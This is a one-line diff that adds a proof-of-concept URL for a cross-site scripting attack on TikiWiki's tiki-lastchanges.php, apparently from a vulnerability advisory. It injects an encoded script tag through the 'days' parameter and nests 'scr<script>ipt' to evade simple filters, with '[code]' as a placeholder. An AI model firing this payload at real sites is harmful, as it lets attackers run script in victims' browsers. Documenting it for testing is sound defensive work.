@@ -1,0 +1,1 @@
+http://www.example.com/tiki/tiki-lastchanges.php?days=&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;[code]&lt;/scr&lt;/script&gt;ipt&gt;&gt;
